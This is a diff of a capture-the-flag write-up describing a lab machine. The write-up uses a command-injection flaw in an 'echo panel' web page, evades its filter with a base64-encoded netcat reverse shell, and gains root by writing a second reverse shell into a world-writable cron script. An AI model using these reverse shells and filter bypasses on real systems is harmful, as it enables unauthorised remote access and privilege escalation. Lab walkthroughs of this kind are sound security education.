@@ -67,19 +67,25 @@ and a link to an pannel called "secret echo pannel"
 there you can echo some your input out witch internally executes the echo command but you somhow have to bypass the filters and gain RCE
 when you find out `` is permitted and you execute commands with it (you have to execute them seperatly at ';' because this char is filterd )
 the best way to bypass the filter is just with a base64 encoded reverse shell payload
+
 ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4243 >/tmp/f ```
+
 to this
 
 ```cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgWU9VUl9JUCA0MjQzID4vdG1wL2Y=```
 
 since the equals sign is also filterd you will have to remove it witch leaves you with this payload
+
 ```echo "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgWU9VUl9JUCA0MjQzID4vdG1wL2Y" | base64 -d | bash```
+
 then you get access to to machine and find the user flag located in /home/user/
 
 ## Machine 
 you see theres cronjob running on a file owend by root(location: /timer/timer.sh) but wrteable by everyone
 add your reverse shell (use a different port this time)
+
 ```rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4243 >/tmp/f```
+
 the location of the root flag is in the root folder
 
 
